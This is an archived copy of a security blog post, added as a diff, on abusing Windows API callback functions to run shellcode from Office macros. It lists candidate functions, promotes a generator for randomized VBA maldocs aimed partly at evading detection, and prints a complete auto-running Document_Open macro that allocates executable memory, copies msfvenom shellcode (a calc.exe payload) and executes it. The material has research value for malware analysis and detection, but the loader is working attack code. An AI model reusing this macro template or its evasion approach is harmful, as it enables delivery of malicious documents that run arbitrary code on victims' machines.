@@ -1,0 +1,354 @@
+# http://ropgadget.com/posts/abusing_win_functions.html
+
+<!DOCTYPE html><html>
+	<body>
+		<div class="nav">
+			<div class="container">
+				<ul id="menu">
+					<li><a href="http://ropgadget.com/index.html">root@ropgadget[.]com:~#</a></li>
+					<li><a href="http://ropgadget.com/main.html">_Zmain</a></li>
+					<li><a href="http://ropgadget.com/about.html">disass</a></li>
+					<li><a href="http://ropgadget.com/sections.html">.Sections</a></li>
+					<li><a href="http://ropgadget.com/links.html">PLT</a></li>
+					<li><a href="http://ropgadget.com/mvc2.html">MvC2</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="main">
+			<div class="container"> <!-- Section Name -->
+				/* CAT(1) */
+			</div>
+		</div>
+		<div class="articles"> <!-- Keep 5 -->
+			<div class="container">
+<!-- -->
+                <div class="titles"> <!-- Article Title -->
+                    <a href="http://ropgadget.com/posts/abusing_win_functions.html">17JAN2017 - Abusing native Windows functions for shellcode execution</a>
+                </div>
+<!-- Blog Entry -->
+<p>By <a href="https://www.linkedin.com/in/jeff-white-459a6416/">Jeff White</a> <a href="https://twitter.com/noottrak">(karttoon)</a></p>
+
+<p>I've been doing a lot of analysis on malicious docs (maldocs) lately and, among a popular variant circulating right now, is a technique that I found particularly interesting. Effectively, it abuses native Windows function calls to transfer execution to shellcode that it loads into memory. I thought it was cool in this context, and not something that I was super familiar with, even though I've since learned it's a very old technique, so I set out to do some research in identifying additional functions that could be abused in a similar way and how to leverage them.</p>
+
+<p>To give you an idea of how this works, I'll go over a quick example of how shellcode can be executed through a function. For this, I'll use <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648039(v=vs.85).aspx">EnumResourceTypesA</a>.</p>
+
+<div class="code">EnumResourceTypesA(
+    __in_opt HMODULE hModule,
+    __in     ENUMRESTYPEPROCA lpEnumFunc,
+    __in     LONG_PTR lParam
+    );
+</div>
+
+<p>As stated by Microsoft, this function "enumerates resource types within a binary module" and the second argument, the interesting bit, is "a pointer to the callback function to be called for each enumerated resource type". If I supply the memory address of the shellcode to lpEnumFunc, it will pass each enumerated resource to that function but, since it's the shellcode, it just executes whatever is at the memory address I provided - keep in mind the memory page still needs to allow for code execution.</p>
+
+<p>In the context of maldocs, VBA gives you the capabilities to directly call Windows functions yet, outside of VBA, these functions can also be leveraged during typical exploitation attacks if you know the target application already has the function imported. You could possibly save ROP chain space that might typically be used for certain gadgets that carry out like functionality as well, depending on the function and required arguements. In addition, from a general offsec perspective, if you continue using the same function calls for your maldocs, you leave a very clear pattern of dynamic and static artifacts that make it trivial to track and detect, so it's nice to have the option of mixing things up a bit. As the saying goes, variety is the spice of life!</p>
+
+<p>To enumerate all of the possible functions, I looked at the C header files that come in the Windows 7 x86 SDK.</p>
+
+<div class="code">$ cat *.h |tr '\r\n' ' ' |tr ';' '\n' |sed -e 's/--//g' -e 's/    / /g' |grep -iE "__in.+(Func|Proc|CallBack| lpfn| lpproc)," |grep -oE " [a-zA-Z]+\([a-zA-Z0-9*_, ]+\)" |grep "__in" |cut -d"(" -f1 |sort -u |sed -e 's/^ //g'
+</div>
+
+<p>The meat of it is the grep for '(Func|Proc|CallBack| lpfn| lpproc)', the rest is mainly attempting to normalize the header file function structures for easier parsing since they were all over the place in terms of style.</p>
+
+<p>After getting a list of candidate functions, I set out testing each one to try and figure out which would be the most likely to be used in maldocs. This equated to me reading the MSDN article to understand the purpose of the function and then a few quick lines of VBA to see if I could get it working. While most of these can most likely be massaged into executing code at your specified address, there isn't a lot of reward in chaining together multiple functions to do so with the abundance of "easy" ones. For example, the DestroyCluster function has a similar callback argument, but you'd have to also call CreateCluster and OpenCluster to setup the environment first, which is a bit much for the usecase.</p>
+
+<p>The below table lists the identified functions which appeared to have the ability to accept a memory address for code execution and may be open to possible abuse.</p>
+
+<div class="code"><table><tbody><tr>
+<td>AddClusterNode</td>
+<td>BluetoothRegisterForAuthentication</td>
+<td>CMTranslateRGBsExt</td>
+</tr><tr>
+<td><font color="red">CallWindowProcA</font></td>
+<td><font color="red">CallWindowProcW</font></td>
+<td>CreateCluster</td>
+</tr><tr>
+<td>CreateDialogIndirectParamA</td>
+<td>CreateDialogIndirectParamW</td>
+<td>CreateDialogParamA</td>
+</tr><tr>
+<td>CreateDialogParamW</td>
+<td>CreatePrintAsyncNotifyChannel</td>
+<td>CreateTimerQueueTimer</td>
+</tr><tr>
+<td>DavRegisterAuthCallback</td>
+<td>DbgHelpCreateUserDump</td>
+<td>DbgHelpCreateUserDumpW</td>
+</tr><tr>
+<td>DdeInitializeA</td>
+<td>DdeInitializeW</td>
+<td>DestroyCluster</td>
+</tr><tr>
+<td><font color="red">DialogBoxIndirectParamA</font></td>
+<td><font color="red">DialogBoxIndirectParamW</font></td>
+<td>DialogBoxParamA</td>
+</tr><tr>
+<td>DialogBoxParamW</td>
+<td>DirectSoundCaptureEnumerateA</td>
+<td>DirectSoundCaptureEnumerateW</td>
+</tr><tr>
+<td>DirectSoundEnumerateA</td>
+<td>DirectSoundEnumerateW</td>
+<td>DrawStateA</td>
+</tr><tr>
+<td>DrawStateW</td>
+<td><font color="red">EnumCalendarInfoA</font></td>
+<td><font color="red">EnumCalendarInfoW</font></td>
+</tr><tr>
+<td>EnumChildWindows</td>
+<td><font color="red">EnumDateFormatsA</font></td>
+<td><font color="red">EnumDateFormatsW</font></td>
+</tr><tr>
+<td><font color="red">EnumDesktopWindows</font></td>
+<td><font color="red">EnumDesktopsA</font></td>
+<td><font color="red">EnumDesktopsW</font></td>
+</tr><tr>
+<td>EnumEnhMetaFile</td>
+<td>EnumFontFamiliesA</td>
+<td>EnumFontFamiliesExA</td>
+</tr><tr>
+<td>EnumFontFamiliesExW</td>
+<td>EnumFontFamiliesW</td>
+<td>EnumFontsA</td>
+</tr><tr>
+<td>EnumFontsW</td>
+<td>EnumICMProfilesA</td>
+<td>EnumICMProfilesW</td>
+</tr><tr>
+<td><font color="red">EnumLanguageGroupLocalesA</font></td>
+<td><font color="red">EnumLanguageGroupLocalesW</font></td>
+<td>EnumMetaFile</td>
+</tr><tr>
+<td>EnumObjects</td>
+<td><font color="red">EnumPropsExA</font></td>
+<td><font color="red">EnumPropsExW</font></td>
+</tr><tr>
+<td><font color="red">EnumPwrSchemes</font></td>
+<td>EnumResourceLanguagesA</td>
+<td>EnumResourceLanguagesExA</td>
+</tr><tr>
+<td>EnumResourceLanguagesExW</td>
+<td>EnumResourceLanguagesW</td>
+<td>EnumResourceNamesA</td>
+</tr><tr>
+<td>EnumResourceNamesExA</td>
+<td>EnumResourceNamesExW</td>
+<td>EnumResourceNamesW</td>
+</tr><tr>
+<td><font color="red">EnumResourceTypesA</font></td>
+<td><font color="red">EnumResourceTypesW</font></td>
+<td><font color="red">EnumResourceTypesExA</font></td>
+</tr><tr>
+<td><font color="red">EnumResourceTypesExW</font></td>
+<td>EnumResourceTypesW</td>
+<td><font color="red">EnumSystemCodePagesA</font></td>
+</tr><tr>
+<td><font color="red">EnumSystemCodePagesW</font></td>
+<td><font color="red">EnumSystemLanguageGroupsA</font></td>
+<td><font color="red">EnumSystemLanguageGroupsW</font></td>
+</tr><tr>
+<td><font color="red">EnumSystemLocalesA</font></td>
+<td><font color="red">EnumSystemLocalesW</font></td>
+<td><font color="red">EnumThreadWindows</font></td>
+</tr><tr>
+<td><font color="red">EnumTimeFormatsA</font></td>
+<td><font color="red">EnumTimeFormatsW</font></td>
+<td><font color="red">EnumUILanguagesA</font></td>
+</tr><tr>
+<td><font color="red">EnumUILanguagesW</font></td>
+<td><font color="red">EnumWindowStationsA</font></td>
+<td><font color="red">EnumWindowStationsW</font></td>
+</tr><tr>
+<td><font color="red">EnumWindows</font></td>
+<td><font color="red">EnumerateLoadedModules</font></td>
+<td><font color="red">EnumerateLoadedModulesEx</font></td>
+</tr><tr>
+<td><font color="red">EnumerateLoadedModulesExW</font></td>
+<td>EventRegister</td>
+<td>GetApplicationRecoveryCallback</td>
+</tr><tr>
+<td><font color="red">GrayStringA</font></td>
+<td><font color="red">GrayStringW</font></td>
+<td>KsCreateFilterFactory</td>
+</tr><tr>
+<td>KsMoveIrpsOnCancelableQueue</td>
+<td>KsStreamPointerClone</td>
+<td>KsStreamPointerScheduleTimeout</td>
+</tr><tr>
+<td>LineDDA</td>
+<td>MFBeginRegisterWorkQueueWithMMCSS</td>
+<td>MFBeginUnregisterWorkQueueWithMMCSS</td>
+</tr><tr>
+<td>MFPCreateMediaPlayer</td>
+<td>MQReceiveMessage</td>
+<td>MQReceiveMessageByLookupId</td>
+</tr><tr>
+<td><font color="red">NotifyIpInterfaceChange</font></td>
+<td>NotifyStableUnicastIpAddressTable</td>
+<td><font color="red">NotifyTeredoPortChange</font></td>
+</tr><tr>
+<td><font color="red">NotifyUnicastIpAddressChange</font></td>
+<td>PerfStartProvider</td>
+<td>PlaExtractCabinet</td>
+</tr><tr>
+<td>ReadEncryptedFileRaw</td>
+<td>RegisterApplicationRecoveryCallback</td>
+<td>RegisterForPrintAsyncNotifications</td>
+</tr><tr>
+<td>RegisterServiceCtrlHandlerExA</td>
+<td>RegisterServiceCtrlHandlerExW</td>
+<td>RegisterWaitForSingleObject</td>
+</tr><tr>
+<td>RegisterWaitForSingleObjectEx</td>
+<td><font color="red">SHCreateThread</font></td>
+<td><font color="red">SHCreateThreadWithHandle</font></td>
+</tr><tr>
+<td><font color="red">SendMessageCallbackA</font></td>
+<td><font color="red">SendMessageCallbackW</font></td>
+<td>SetTimerQueueTimer</td>
+</tr><tr>
+<td><font color="red">SetWinEventHook</font></td>
+<td><font color="red">SetWindowsHookExA</font></td>
+<td><font color="red">SetWindowsHookExW</font></td>
+</tr><tr>
+<td>SetupDiRegisterDeviceInfo</td>
+<td>SymEnumLines</td>
+<td>SymEnumLinesW</td>
+</tr><tr>
+<td>SymEnumProcesses</td>
+<td>SymEnumSourceLines</td>
+<td>SymEnumSourceLinesW</td>
+</tr><tr>
+<td>SymEnumSymbols</td>
+<td>SymEnumSymbolsForAddr</td>
+<td>SymEnumSymbolsForAddrW</td>
+</tr><tr>
+<td>SymEnumSymbolsW</td>
+<td>SymEnumTypes</td>
+<td>SymEnumTypesByName</td>
+</tr><tr>
+<td>SymEnumTypesByNameW</td>
+<td>SymEnumTypesW</td>
+<td>SymEnumerateModules</td>
+</tr><tr>
+<td>SymEnumerateModules64</td>
+<td>SymEnumerateSymbols</td>
+<td>SymEnumerateSymbols64</td>
+</tr><tr>
+<td>SymEnumerateSymbolsW</td>
+<td>SymSearch</td>
+<td>SymSearchW</td>
+</tr><tr>
+<td>TranslateBitmapBits</td>
+<td>WPUQueryBlockingCallback</td>
+<td>WdsCliTransferFile</td>
+</tr><tr>
+<td>WdsCliTransferImage</td>
+<td>WinBioCaptureSampleWithCallback</td>
+<td>WinBioEnrollCaptureWithCallback</td>
+</tr><tr>
+<td>WinBioIdentifyWithCallback</td>
+<td>WinBioLocateSensorWithCallback</td>
+<td>WinBioRegisterEventMonitor</td>
+</tr><tr>
+<td>WinBioVerifyWithCallback</td>
+<td>WlanRegisterNotification</td>
+<td>WriteEncryptedFileRaw</td>
+</tr><tr>
+<td>WsPullBytes</td>
+<td>WsPushBytes</td>
+<td>WsReadEnvelopeStart</td>
+</tr><tr>
+<td>WsRegisterOperationForCancel</td>
+<td>WsWriteEnvelopeStart</td>
+<td>mciSetYieldProc</td>
+</tr><tr>
+<td>midiInOpen</td>
+<td>midiOutOpen</td>
+<td>mixerOpen</td>
+</tr><tr>
+<td>mmioInstallIOProcA</td>
+<td>mmioInstallIOProcW</td>
+<td>waveInOpen</td>
+</tr><tr>
+<td>waveOutOpen</td>
+</tr></tbody></table>
+</div>
+
+<p>Out of that list, I was able to get the 49 functions, highlighted in red, to execute basic Calc shellcode with little to no additional interaction. At most, I had to provide some unique data, such as a handle to a process or specific values, but for the most part they are standalone and accept a 0 or 1 as values to every other argument the function needs.</p>
+
+<p>I wrapped all of this into a small little script I'm calling trigen (think 3 combo-generator) which randomly puts together a VBA macro using API calls from pools of functions for allocating memory (4 total), copying shellcode to memory (2 total), and then finally abusing the Win32 function call to get code execution (48 total - I left SetWinEventHook out due to aforementioned need to chain functions). In total, there are 384 different possible macro combinations that it can spit out.</p>
+
+<p>The tool can be downloaded from <a href="https://github.com/karttoon/trigen">here</a> and will generate output similar to the below. It takes one argument, which is the hex-string of the shellcode, but it will do some minimal parsing of msfvenom output too (C or Py).</p>
+
+<div class="code"># python trigen.py "$(msfvenom --payload windows/exec CMD='calc.exe' -f c)"
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 193 bytes
+
+################################################
+#                                              #
+#   Copy VBA to Microsoft Office 97-2003 DOC   #
+#                                              #
+#   Alloc: HeapAlloc                           #
+#   Write: RtlMoveMemory                       #
+#   ExeSC: EnumSystemCodePagesW                #
+#                                              #
+################################################
+
+Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
+Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
+Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
+Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long
+
+Private Sub Document_Open()
+
+Dim shellCode As String
+Dim shellLength As Byte
+Dim byteArray() As Byte
+Dim memoryAddress As Long
+Dim zL As Long
+zL = 0
+Dim rL As Long
+
+shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"
+
+shellLength = Len(shellCode) / 2
+ReDim byteArray(0 To shellLength)
+
+For i = 0 To shellLength - 1
+
+    If i = 0 Then
+        pos = i + 1
+    Else
+        pos = i * 2 + 1
+    End If
+    Value = Mid(shellCode, pos, 2)
+    byteArray(i) = Val("&amp;H" &amp; Value)
+
+Next
+
+rL = createMemory(&amp;H40000, zL, zL)
+memoryAddress = allocateMemory(rL, zL, &amp;H5000)
+
+copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1
+
+executeResult = shellExecute(memoryAddress, zL)
+
+End Sub
+</div>
+
+<p>The logic of the code is fairly straight forward. Allocate memory, copy shellcode into memory, transfer execution to the shellcode via abused function call. The script will include the necessary code for each part.</p>
+
+<p>I'm also including the VBA I worked from as I went through my testing, which has some notes and other tidbits. Feel free to experiment with that or pick up where I left off.</p>
+
+<p>Cheers!</p>
+<!-- -->
+
+<br><br><br>
+<p><a href="http://ropgadget.com/sections.html">Older posts...</a></p>
+			</div>
+		</div>
+	
+</body></html>
